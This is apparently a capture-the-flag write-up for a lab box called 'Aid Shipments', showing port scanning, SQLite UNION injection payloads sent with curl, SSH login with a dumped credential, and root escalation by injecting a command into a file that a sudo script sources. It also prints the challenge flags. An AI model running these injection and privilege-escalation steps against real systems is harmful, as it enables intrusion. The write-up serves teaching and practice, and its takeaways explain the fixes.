<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Aid+Shipments" alt="Typing SVG" /></a>

</div>

# Aid Shipments — PWN · JID-Pwn203 · Level 4 · 🟡 MEDIUM

- **Status:** ✅ SOLVED (4/4) — full boot2root chain; all flags confirmed.
- **Points:** 1700 / 1700 (ports 175 · user 300 · user flag 475 · root flag 750)
- **Flags:** Open TCP ports → Low-priv user → User flag → Root flag (ports/user plaintext, flags `CTF{...}`)
- **Target:** `10.10.10.23` (lab network, over WireGuard VPN)
- **Prompt:** *"Aid ledger"* — mechanically a NET/boot2root box.

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2200,8880` | ✅ |
| 2 | Low privilege user | `clerk` | ✅ |
| 3 | User flag | `CTF{72ef68f35958321c3b6a6c95e8e84957}` | ✅ |
| 4 | Root flag | `CTF{859722cb244d6bab86782c40ecee3082}` | ✅ |

---

## TL;DR

1. Two ports: SSH (patched, not the vector) + a Python "Aid ledger" HTTP app on `:8880`.
2. Unparameterized `POST /search` `q` → SQLite UNION injection dumps a planted `clerk` / `pallet-3` credential.
3. SSH in for the user flag; privesc via `sudo NOPASSWD /opt/aid/filter.sh`, which `source`s a clerk-owned `filter.conf` → run a command as root → root flag.

8th sibling of the JID boot2root series (cf. `HarborWatch`, `NightWatchRoster`, `EscortConvoy`, `VisitorBadges`, `RadioShack`, `CoastalRadar`, `EmbassyGate`). Same skeleton: 2 open ports (SSH high port + Python `BaseHTTPServer 0.6`), Flag1 = open ports, Flag2 = theme-derived username, Flag3 = `/home/user.txt`, Flag4 = `/root/root.txt` via sudo misconfig. The twist this time: foothold is **SQL injection** in the ledger search (not the usual path-traversal file read).

> Flag format: `CTF{...}`. Claude ran nothing against the box — every command executed manually by the user.

---

## 0. Connect

```bash
sudo wg-quick up ./team-71-player-a.conf
```

## Recon — Flag 1: Open TCP ports

```bash
sudo nmap -sS -p- -T4 --max-retries 6 -Pn -n 10.10.10.23 -oN nmap-23-full.txt
sudo nmap -sC -sV -p 2200,8880 -Pn -n 10.10.10.23 -oN nmap-23-svc.txt
```
```
2200/tcp open ssh  OpenSSH 9.2p1 Debian 2+deb12u10
8880/tcp open http BaseHTTPServer 0.6 (Python 3.11.2)  -- title "Aid ledger"
```
SSH 9.2p1 patched → not the vector. The Python "Aid ledger" app on :8880 is the attack surface.

**Flag 1** = `2200,8880` ✅

## Foothold — Flag 2: Low privilege user

`GET /` serves an "Aid ledger" page with `POST /search` (param `q`). The `q` goes straight into a SQLite query (`... LIKE '%<q>%'`), unparameterized:

```bash
curl -sS -X POST http://10.10.10.23:8880/search --data-urlencode "q='"
# sql error: unrecognized token: "'''"   → SQLite injection
```

Two columns, one table:

```bash
curl -sS -X POST http://10.10.10.23:8880/search --data-urlencode "q=' UNION SELECT 1,2-- -"                       # 2 cols confirmed
curl -sS -X POST http://10.10.10.23:8880/search --data-urlencode "q=' UNION SELECT name,sql FROM sqlite_master-- -"
# shipments  CREATE TABLE shipments(name text, note text)
```

`readfile()` is disabled (`no such function: readfile`), so no file read via SQLi. Dump the table — the credential is planted in a row:

```bash
curl -sS -X POST http://10.10.10.23:8880/search --data-urlencode "q=' UNION SELECT name,note FROM shipments-- -"
# bandages  routine
# clerk     pallet-3
```

`name=clerk` (theme: the aid-ledger clerk) + `note=pallet-3` = SSH credential. Confirm locally:

```bash
sshpass -p 'pallet-3' ssh -p 2200 -o StrictHostKeyChecking=no clerk@10.10.10.23 id
# uid=1000(clerk) gid=1000(clerk) groups=1000(clerk)
```

**Flag 2** = `clerk` ✅

## User flag — Flag 3

```bash
sshpass -p 'pallet-3' ssh -p 2200 clerk@10.10.10.23 'cat /home/user.txt'
```
`/home/user.txt` is `-r--------` owned by clerk (one level above `~`).

**Flag 3** = `CTF{72ef68f35958321c3b6a6c95e8e84957}` ✅

## Privesc — Flag 4: Root flag

```bash
sudo -n -l
# (root) NOPASSWD: /opt/aid/filter.sh
cat /opt/aid/filter.sh
# #!/bin/bash
# source /home/clerk/filter.conf
```

`filter.sh` runs as root (NOPASSWD) and **`source`s a clerk-owned file** (`~/filter.conf`, normally `MODE=quiet`). `source` executes the file as bash **as root** → put a command in it. The script prints nothing itself, so the injected command does the printing:

```bash
sshpass -p 'pallet-3' ssh -p 2200 clerk@10.10.10.23 \
  'printf "id; cat /root/root.txt\n" > ~/filter.conf; sudo /opt/aid/filter.sh; printf "MODE=quiet\n" > ~/filter.conf'
# uid=0(root) gid=0(root) groups=0(root)
# CTF{859722cb244d6bab86782c40ecee3082}
```

**Flag 4** = `CTF{859722cb244d6bab86782c40ecee3082}` ✅

## Summary / Chain

| # | Flag | Value | Vector |
|---|------|-------|--------|
| 1 | Open TCP ports | `2200,8880` | `nmap -p-` (exclude filtered) |
| 2 | Low privilege user | `clerk` | SQLi UNION in `POST /search` → `shipments` row `clerk`/`pallet-3` |
| 3 | User flag | `CTF{72ef68f35958321c3b6a6c95e8e84957}` | SSH `clerk:pallet-3` :2200 → `/home/user.txt` |
| 4 | Root flag | `CTF{859722cb244d6bab86782c40ecee3082}` | `sudo NOPASSWD /opt/aid/filter.sh` `source`s clerk-owned `filter.conf` → cmd as root |

### Takeaways
- Series twist: foothold was **SQLi**, not the usual path-traversal read. `q` → `LIKE '%<q>%'` unparameterized; 2-col UNION dumped the planted credential. Parameterize queries.
- `readfile()` not compiled into Python's `sqlite3` → no file read via SQLi; the creds were in-table on purpose.
- Privesc = the same `source`-an-owned-file-as-root ending as VisitorBadges (`badge-render`). Never `source` a user-writable file from a privileged context.
- Username theme-derived (`clerk`) and confirmed with `sshpass ... id` before submitting — never guess into the box.

### Rules reminder
- Only confirmed flags were submitted. Every command was run manually by the player; Claude ran nothing against the target.
